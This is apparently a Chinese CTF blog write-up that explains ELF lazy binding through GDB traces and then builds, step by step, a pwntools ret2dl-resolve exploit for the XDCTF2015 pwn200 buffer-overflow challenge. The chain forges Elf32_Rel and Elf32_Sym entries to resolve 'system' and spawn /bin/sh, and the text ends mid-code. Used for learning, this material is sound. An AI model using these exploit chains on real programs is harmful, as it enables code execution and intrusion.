<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Sword     d_tag;    /*d_tag 的取值决定了该如何解释 d_un*/</span><br><span class="line">    union &#123;</span><br><span class="line">        Elf32_Word  d_val;</span><br><span class="line">        Elf32_Addr  d_ptr;    /*程序的虚拟地址*/</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line">extern Elf32_Dyn_DYNAMIC[];</span><br></pre></td></tr></table></figure>
<blockquote>
<p>经过上述的介绍，可以知道这个节中包含了.rel.plt（重定向表）、.dynsym（动态符号表）、.dynstr（动态字符串表），来看下程序中的.dynamic（动态节）。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08049F28 stru_8049F28    Elf32_Dyn &lt;1, &lt;10h&gt;&gt;    ; DATA XREF: LOAD:080480BC↑o</span><br><span class="line">LOAD:08049F28                                         ; .got.plt:08049FF4↓o</span><br><span class="line">LOAD:08049F28                                         ; DT_NEEDED libc.so.6</span><br><span class="line">LOAD:08049F30                 Elf32_Dyn &lt;0Ch, &lt;8048340h&gt;&gt; ; DT_INIT</span><br><span class="line">LOAD:08049F38                 Elf32_Dyn &lt;0Dh, &lt;804861Ch&gt;&gt; ; DT_FINI</span><br><span class="line">LOAD:08049F40                 Elf32_Dyn &lt;6FFFFEF5h, &lt;80481ACh&gt;&gt; ; DT_GNU_HASH</span><br><span class="line">LOAD:08049F48                 Elf32_Dyn &lt;5, &lt;8048268h&gt;&gt; ; DT_STRTAB  /*.dynstr（动态字符串表）*/</span><br><span class="line">LOAD:08049F50                 Elf32_Dyn &lt;6, &lt;80481D8h&gt;&gt; ; DT_SYMTAB /*.dynsym（动态符号表）*/</span><br><span class="line">LOAD:08049F58                 Elf32_Dyn &lt;0Ah, &lt;64h&gt;&gt;  ; DT_STRSZ</span><br><span class="line">LOAD:08049F60                 Elf32_Dyn &lt;0Bh, &lt;10h&gt;&gt;  ; DT_SYMENT</span><br><span class="line">LOAD:08049F68                 Elf32_Dyn &lt;15h, &lt;0&gt;&gt;    ; DT_DEBUG</span><br><span class="line">LOAD:08049F70                 Elf32_Dyn &lt;3, &lt;8049FF4h&gt;&gt; ; DT_PLTGOT</span><br><span class="line">LOAD:08049F78                 Elf32_Dyn &lt;2, &lt;28h&gt;&gt;    ; DT_PLTRELSZ</span><br><span class="line">LOAD:08049F80                 Elf32_Dyn &lt;14h, &lt;11h&gt;&gt;  ; DT_PLTREL</span><br><span class="line">LOAD:08049F88                 Elf32_Dyn &lt;17h, &lt;8048318h&gt;&gt; ; DT_JMPREL  /*.rel.plt（重定向表）*/</span><br><span class="line">LOAD:08049F90                 Elf32_Dyn &lt;11h, &lt;8048300h&gt;&gt; ; DT_REL</span><br><span class="line">LOAD:08049F98                 Elf32_Dyn &lt;12h, &lt;18h&gt;&gt;  ; DT_RELSZ</span><br><span class="line">LOAD:08049FA0                 Elf32_Dyn &lt;13h, &lt;8&gt;&gt;    ; DT_RELENT</span><br><span class="line">LOAD:08049FA8                 Elf32_Dyn &lt;6FFFFFFEh, &lt;80482E0h&gt;&gt; ; DT_VERNEED</span><br><span class="line">LOAD:08049FB0                 Elf32_Dyn &lt;6FFFFFFFh, &lt;1&gt;&gt; ; DT_VERNEEDNUM</span><br><span class="line">LOAD:08049FB8                 Elf32_Dyn &lt;6FFFFFF0h, &lt;80482CCh&gt;&gt; ; DT_VERSYM</span><br><span class="line">LOAD:08049FC0                 Elf32_Dyn &lt;0&gt;           ; DT_NULL</span><br></pre></td></tr></table></figure>
<blockquote>
<p>画重点：<br>LOAD:08049F48                 Elf32_Dyn &lt;5, <8048268h>&gt; ; DT_STRTAB  /*.dynstr（动态字符串表）*/<br>LOAD:08049F50                 Elf32_Dyn &lt;6, <80481d8h>&gt; ; DT_SYMTAB /*.dynsym（动态符号表）*/<br>LOAD:08049F88                 Elf32_Dyn &lt;17h, <8048318h>&gt; ; DT_JMPREL  /*.rel.plt（重定向表）*/<br>现在我们看一下具体的过程。<br>这就要从push got[1]开始，通过前面的了解，got[1]是link_map数据结构描述符的地址，执行完这条压栈命令，关注两点。<br>第一、这个地址保存的是什么？<br>第二、这个地址有什么用？<br>第二、此时栈中的内容<br>got[1]处保存的是link_map数据结构描述符的地址，从link_map又可以找到.dynamic表，结合上述的了解，有了.dynamic表就很方便的找到read字符串表（以read函数来举例），如图所示：</8048318h></80481d8h></8048268h></p>
</blockquote>
<p><img src="/image/20200928/image1.png" alt="image"></p>
<blockquote>
<p>前两个问题解决了，再来看栈中的内容，分别是<br>0x8048396 &lt;read@plt+6&gt;:    push   0x8<br>0x8048370:    push   DWORD PTR ds:0x8049ff8<br>这两个压栈的操作产生的结果。<br>指令继续执行，0x8048376:    jmp    DWORD PTR ds:0x8049ffc</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ xinfo 0x8049ffc</span><br><span class="line">0x8049ffc --&gt; 0xf7fee700 (&lt;_dl_runtime_resolve&gt;:	push   eax)</span><br><span class="line">Virtual memory mapping:</span><br><span class="line">Start : 0x08049000</span><br><span class="line">End   : 0x0804a000</span><br><span class="line">Offset: 0xffc</span><br><span class="line">Perm  : r--p</span><br></pre></td></tr></table></figure>
<blockquote>
<p>执行_dl_runtime_resolve函数，看一下原型：_dl_runtime_resolve(link_map_obj, reloc_index)，这里的link_map_obj，reloc_index就是栈里面的两个值，通过link_map和偏移量最终可以找到read函数的。<br>目前我们已经清楚了通过传入两个形参，_dl_runtime_resolve函数进行绑定操作，那么这是怎么一步一步的进行绑定的呢？上面也提到了一部分，通过link_map_obj可以找到.dynamic表，继续往下看，详细讨论一下具体的过程。<br>既然找到了.dynamic表，那么.rel.plt（重定向表）、.dynsym（动态符号表）、.dynstr（动态字符串表）也就有了，先找到这三个表的起始地址。</p>
</blockquote>
<p><img src="/image/20200928/image2.png" alt="image"></p>
<blockquote>
<p>图中的1，2，3处分别代表.dynstr、.dynsym和.rel.plt，使用objdump可以验证一下，其实在ida中或许能够更直接地找到DT_STRTAB、DT_SYMTAB和DT_JMPREL。</p>
</blockquote>
<p><img src="/image/20200928/image3.png" alt="image"></p>
<blockquote>
<p>在回顾中我们提到过，这个0x08是write函数在.rel.plt中的偏移量，所以0x8048318+0x08就能找到read函数的Elf32_Rel。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /2wx 0x8048318+0x08 </span><br><span class="line">0x8048320:	0x0804a004	0x00000207</span><br></pre></td></tr></table></figure>
<blockquote>
<p>根据前面的知识，可以知道</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef struct&#123;</span><br><span class="line">Elf32_Addr r_offset = 0x804A010h ; //这里也是对应的got表地址</span><br><span class="line">Elf32_Word r_info = 0x207h;</span><br><span class="line"> &#125;Elf32_Rel</span><br></pre></td></tr></table></figure>
<blockquote>
<p>现在就是通过r_info来继续寻找，知道找到read函数，然后把地址绑定r_offset指向的got表的单元中。<br>r_info是分为两部分，.dynsym的下标在前八位，那么index = 0x207 &gt;&gt; 8 = 0x2，然后以0x080481d8为起始地址，Elf32_Sym[0x2]来找到read函数的Elf32_Sym。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /wx 0x080481d8+0x2*0x10</span><br><span class="line">0x80481f8:	0x0000002f</span><br></pre></td></tr></table></figure>
<blockquote>
<p>一个结构体长度是0x10，而且通过前面的知识可以知道0x2f就是st_name的值，进而0x08048268+0x2f就可以找到read的字符串。这里需要提一点，这个节是以\x00作为开始和结尾的，而且中间没个字符串也可以以\x00作为间隔。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /wx 0x08048268+0x2f</span><br><span class="line">0x8048297:	0x64616572</span><br><span class="line">gdb-peda$ x /s 0x08048268+0x2f</span><br><span class="line">0x8048297:	&quot;read&quot;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>到了这里寻找工作就完毕了，_dl_runtime_resolve中调用_dl_fixup函数完成函数的延迟绑定，也就是将函数的真实地址写入对应的got表中。<br>再来简单看一下_dl_fixup是怎么完成的，其实就是将我们上面分析的过程自动化了，下面是其中一些主要函数。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">    // 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg</span><br><span class="line">    const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    // 然后通过reloc-&gt;r_info找到.dynsym中对应的条目</span><br><span class="line">    const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    // 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7</span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">    // 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span><br><span class="line">    result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL);</span><br><span class="line">    // value为libc基址加上要解析函数的偏移地址，也即实际地址</span><br><span class="line">    value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : 0);</span><br><span class="line">    // 最后把value写入相应的GOT表条目中</span><br><span class="line">    return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x03-XDCTF2015·pwn200"><a href="#0x03-XDCTF2015·pwn200" class="headerlink" title="0x03 XDCTF2015·pwn200"></a>0x03 XDCTF2015·pwn200</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int vuln()&#123;</span><br><span class="line">    char buf[80];</span><br><span class="line">    setbuf(stdin, buf);</span><br><span class="line">    return read(0, buf, 256);</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char** argv)&#123;</span><br><span class="line">    char* welcome = &quot;Welcome to XDCTF2015 ~!\n&quot;;</span><br><span class="line">    setbuf(stdout, welcome)</span><br><span class="line">    write(1, welcome, strlen(welcome));</span><br><span class="line">    vuln();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>可以在攻防世界中找到这个题目。对于我这个萌新，每次看ctfwiki上大佬的rop链都很懵，所以分享一下自己理解步骤。<br>栈迁移的部分就采用上一篇文章的第一种写法。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = [&apos;deepin-terminal&apos;, &apos;-x&apos;, &apos;sh&apos; ,&apos;-c&apos;]</span><br><span class="line">elf = ELF(&apos;bed0c68697f74e649f3e1c64ff7838b8&apos;)</span><br><span class="line">r = process(&apos;./bed0c68697f74e649f3e1c64ff7838b8&apos;)</span><br><span class="line">rop = ROP(&apos;./bed0c68697f74e649f3e1c64ff7838b8&apos;)</span><br><span class="line"></span><br><span class="line">offset = 108 ## find stack overflow length</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">leave_ret = 0x08048481  ## ROPgadget --binary bed0c68697f74e649f3e1c64ff7838b8  --only &apos;leave|ret&apos;</span><br><span class="line">read_plt = elf.plt[&apos;read&apos;]</span><br><span class="line"></span><br><span class="line">r.recvuntil(&apos;Welcome to XDCTF2015~!\n&apos;)</span><br><span class="line">## stack pivoting to bss segment</span><br><span class="line">## new stack size is 0x800</span><br><span class="line">stack_size = 0x800</span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">## padding 108 </span><br><span class="line">rop.raw(&apos;a&apos; * offset)</span><br><span class="line">## faker_ebp1</span><br><span class="line">rop.raw(base_stage)</span><br><span class="line">### stack pivoting, set esp = base_stage</span><br><span class="line">rop.raw(flat(read_plt,leave_ret,0, base_stage, 100))</span><br><span class="line">## print rop.dump()</span><br><span class="line">##gdb.attach(r)</span><br><span class="line">r.sendline(rop.chain())</span><br></pre></td></tr></table></figure>
<blockquote>
<p>下面开始ROP链的一点心得分享：<br>先构造write函数ROP链，将”/bin/sh”打印出来，然后接下来的递进操作都是根据这个为基础开展。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">## write cmd=&quot;/bin/sh&quot;</span><br><span class="line">rop = ROP(&apos;./bed0c68697f74e649f3e1c64ff7838b8&apos;)</span><br><span class="line">sh = &quot;/bin/sh&quot;</span><br><span class="line">rop.raw(base_stage)</span><br><span class="line">rop.write(1, base_stage + 80, len(sh))</span><br><span class="line">rop.raw(&apos;a&apos; * (80 - len(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(&apos;a&apos; * (100 - len(rop.chain())))</span><br><span class="line">##gdb.attach(r)</span><br><span class="line">r.sendline(rop.chain())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/image/20200928/image4.png" alt="image"></p>
<blockquote>
<p>根据前面的知识，我们可以知道，write函数是通过延迟绑定来找到的，捋一下寻找的路线：<br>push reloc_offset -&gt; push link_map_obj -&gt; 找到.dynamic -&gt; 找到三个表的地址  -&gt; .rel.plt+reloc_offset -&gt; Elf32_Rel  -&gt; Elf32_Sym[info&gt;&gt;8] -&gt; st_name -&gt;  wirte字符串<br>可以发现，在各个表的起始地址是固定的情况下，只要控制st_name、r_info、reloc_offset即可操作最后指向那个字符串，比如指向system字符串，就实现对Elf32_Rel中的r_offset的绑定，也就是对got表的绑定。<br>栈迁移使EIP指向了新的栈的第二位，所以我们只需要在栈里面构造新的延迟绑定的操作即可，既然知道了st_name可以控制指向字符串，r_info又可以控制st_name，reloc_offset可以找到r_info的地址，那么我们就从reloc_offset起手，以上面的write操作为基础，通过改变reloc_offset的值来控制其执行新的write函数。<br>这里的构造分为两个步骤来走：<br>一、指令的操作<br>二、栈中内容构造（前面注意过栈里面的内容是什么）<br>如下图所示</p>
</blockquote>
<p><img src="/image/20200928/image5.png" alt="image"></p>
<blockquote>
<p>先来看指令操作，通过将EIP指向填充plt0的单元，那么就会执行到plt表的首项，然后push操作，之后jmp到_dl_runtime_resolve函数地址，进行执行。这就是完全模仿了延迟绑定的一个步骤。其次再来看栈中的内容，栈顶是压入的link_map_obj，第二项就是我们伪造的reloc_offset（图中是用index_offset表示）。这两个条件完全与正常执行的一样，那么只需要伪造reloc_offset，并且使得.rel.plt + reloc_offset = write的rel{r_offset, r_info}即可。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">## write cmd=&quot;/bin/sh&quot;</span><br><span class="line">rop = ROP(&apos;./bed0c68697f74e649f3e1c64ff7838b8&apos;)</span><br><span class="line">sh = &quot;/bin/sh&quot;</span><br><span class="line">## 获取起始地址</span><br><span class="line">plt0 = elf.get_section_by_name(&apos;.plt&apos;).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(&apos;.rel.plt&apos;).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(&apos;.dynsym&apos;).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(&apos;.dynstr&apos;).header.sh_addr</span><br><span class="line">index_offset = 0x20</span><br><span class="line">rop.raw(base_stage)</span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br><span class="line">rop.raw(&apos;aaaa&apos;)</span><br><span class="line">rop.raw(1)</span><br><span class="line">rop.raw(base_stage + 80)</span><br><span class="line">rop.raw(len(sh))</span><br><span class="line">rop.raw(&apos;a&apos; * (80 - len(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(&apos;a&apos; * (100 - len(rop.chain())))</span><br><span class="line">##gdb.attach(r)</span><br><span class="line">r.sendline(rop.chain())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/image/20200928/image6.png" alt="image"></p>
<blockquote>
<p>可以发现通过伪造reloc_offset可以成功执行write函数，那么继续伪造Elf32_Rel，并且使得.rel.plt + reloc_offset等于伪造的Elf32_Rel的地址，然后伪造结构体中的r_offset和r_info。如下图所示：</p>
</blockquote>
<p><img src="/image/20200928/image6-1.png" alt="image"></p>
<blockquote>
<p>把r_offset（重定向入口的偏移）的地址伪造成需要执行的函数的got地址 （其实可以随便搞一个有的导入的函数的got地址）,再伪造r_info，使得r_info&gt;&gt;8后的值，通过Elf32_Sym[r_info&gt;&gt;8]可以找到write函数的.dynstr，然后继续正常执行（在这一步，这个直接使用现成的值即可，可以在代码的注释中看到）。<br>那么问题来了怎么去寻找这个我们已经伪造的REL的位置呢？在上一个步骤也说到了.rel.plt + reloc_offset = write的rel{r_offset, r_info}，那么reloc_offset = 伪造的write的rel{r_offset, r_info}地址 - .rel.plt。<br>看到这，有木有想过，只是到了这一步我们可以控制需要执行的函数吗？当然也可以控制，只是不是我们想要的，只能控制.dynsym中有的。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">## write cmd=&quot;/bin/sh&quot;</span><br><span class="line">rop = ROP(&apos;./bed0c68697f74e649f3e1c64ff7838b8&apos;)</span><br><span class="line">sh = &quot;/bin/sh&quot;</span><br><span class="line">plt0 = elf.get_section_by_name(&apos;.plt&apos;).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(&apos;.rel.plt&apos;).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(&apos;.dynsym&apos;).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(&apos;.dynstr&apos;).header.sh_addr</span><br><span class="line">## write:rel_adder &#123;r_offset, r_info &#125;</span><br><span class="line">faker_reloc_addr =  base_stage + 28 ## rop链长度为28 4*7 再下一个位置开始reloc</span><br><span class="line">## r_offset -&gt; write: got</span><br><span class="line">r_offset = elf.got[&apos;write&apos;]</span><br><span class="line">## r_info -&gt; LOAD:08048338  Elf32_Rel &lt;804A010h, 507h&gt; ; R_386_JMP_SLOT write</span><br><span class="line">r_info = 0x507 </span><br><span class="line">index_offset = faker_reloc_addr - rel_plt</span><br><span class="line">faker_reloc = p32(r_offset) + p32(r_info)</span><br><span class="line">rop.raw(base_stage)</span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br><span class="line">rop.raw(&apos;aaaa&apos;)</span><br><span class="line">rop.raw(1)</span><br><span class="line">rop.raw(base_stage + 80)</span><br><span class="line">rop.raw(len(sh))</span><br><span class="line">rop.raw(faker_reloc)</span><br><span class="line">rop.raw(&apos;a&apos; * (80 - len(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(&apos;a&apos; * (100 - len(rop.chain())))</span><br><span class="line">##gdb.attach(r)</span><br><span class="line">r.sendline(rop.chain())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/image/20200928/image7.png" alt="image"></p>
<blockquote>
<p>成功伪造Elf32_Rel，程序可以顺利执行，接下来再去伪造Elf32_Sym。如下图所示：</p>
</blockquote>
<p><img src="/image/20200928/image7-1.png" alt="image"></p>
<blockquote>
<p>那么就是对Elf32_Sym的st_name下手，因为他是决定执行哪个函数的关键（st_name+.dynstr），并且让Elf32_Sym[r_info&gt;&gt;8]来找到我们伪造的Elf32_Sym。先来伪造Elf32_Sym，我就是可以通过伪造st_name来执行我们需要的函数，直接把st_name赋值0x00000054，这样st_name+.dynstr找到write函数，具体st_name怎么计算方法下一步再说，结构体的其他变量的值也要伪造出来，文章开头的内容提到了。需要注意的是，因为.dynsym里的Elf32_Sym结构体都是0x10字节大小，因此需要对齐（在代码中可以具体看到）。最后再来看伪造r_info，通过Elf32_Sym[r_info&gt;&gt;8]可以找到伪造的write函数的Elf32_Sym，r_info的高八位就是（伪造的Elf32_Sym地址减去.dynsym）/0x10。这里也有个注意点，r_info 的是由重定向入口的类型和符号组成的，符号作为高八位是需要伪造的下标，类型是R_386_JUMP_SLOT，也就是0x7，最后r_info = ((伪造的Elf32_Sym地址减去.dynsym)/0x10)&lt;&lt;8 | 0x7。<br>此时可以发现我们又进了一步，可以通过st_name 来找到指定函数的dynstr中的函数符号了。换一种说法 也就是说我们此时可以通过st_name这个偏移来指向我们自己可控制的区域里面，我们这个区域构造一个函数的Elf32_Sym那么就实现任意函数绑定。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">## write cmd=&quot;/bin/sh&quot;</span><br><span class="line">rop = ROP(&apos;./bed0c68697f74e649f3e1c64ff7838b8&apos;)</span><br><span class="line">sh = &quot;/bin/sh&quot;</span><br><span class="line">plt0 = elf.get_section_by_name(&apos;.plt&apos;).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(&apos;.rel.plt&apos;).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(&apos;.dynsym&apos;).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(&apos;.dynstr&apos;).header.sh_addr</span><br><span class="line">faker_reloc_addr =  base_stage + 28 ## write:rel_addr 4*7 == 28  </span><br><span class="line">index_offset = faker_reloc_addr - rel_plt ## plt: push index_offset</span><br><span class="line">## r_offset -&gt; write: got</span><br><span class="line">r_offset = elf.got[&apos;write&apos;]</span><br><span class="line">## faker_sym</span><br><span class="line">faker_sym_addr = base_stage + 36 ##  28 + 2*4  == 36</span><br><span class="line">align = 0x10 - ((faker_sym_addr - dynsym) &amp; 0xf) # aligin 0x10 这是Elf32_Sym结构体，每个结构体为0x10字节大小</span><br><span class="line">faker_sym_addr += align ## 进行对齐</span><br><span class="line">index_sym = (faker_sym_addr - dynsym)/0x10 # struct &#123;0x10&#125;Elf32_Sym index_sym只是下标Elf32_Sym[index_sym]，来取结构体，每个结构体大小是0x10，所以偏移除以0x10才是下标</span><br><span class="line">## write:Elf32_Rel &#123;r_offset, r_info &#125;</span><br><span class="line">r_info = (index_sym &lt;&lt; 8) | 0x7 # r_info&gt;&gt;8 = index_sym | R_386_JUMP_SLOT</span><br><span class="line">faker_reloc = p32(r_offset) + p32(r_info)</span><br><span class="line">## write: LOAD:08048228  Elf32_Sym &lt;0x00000054, 0, 0, 12h, 0, 0&gt; ; &quot;write&quot;</span><br><span class="line">st_name = 0x00000054</span><br><span class="line">faker_sym = flat(st_name,0,0,0x12)</span><br><span class="line"></span><br><span class="line">rop.raw(base_stage)</span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br><span class="line">rop.raw(&apos;aaaa&apos;)</span><br><span class="line">rop.raw(1)</span><br><span class="line">rop.raw(base_stage + 80)</span><br><span class="line">rop.raw(len(sh))</span><br><span class="line">rop.raw(faker_reloc)</span><br><span class="line">rop.raw(&apos;a&apos;*align) ##  padding to align  因为对齐缘故 faker_sym_addr（本来是计算好的，是连续的地址）可能会变，也就是会+align，所以rop进行填充时的地址也需要+align，保证faker_sym对齐</span><br><span class="line">rop.raw(faker_sym)</span><br><span class="line">rop.raw(&apos;a&apos; * (80 - len(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(&apos;a&apos; * (100 - len(rop.chain())))</span><br><span class="line">##gdb.attach(r)</span><br><span class="line">r.sendline(rop.chain())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/image/20200928/image8.png" alt="image"></p>
<blockquote>
<p>程序依然顺利执行，现在到了伪造任意函数的时候了，伪造STR，直接在选定位置 system\x00即可。那么这个关键是st_name怎么写，使得st_name+.dynstr == 伪造system的地址，st_name=伪造system的地址-.dynstr。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 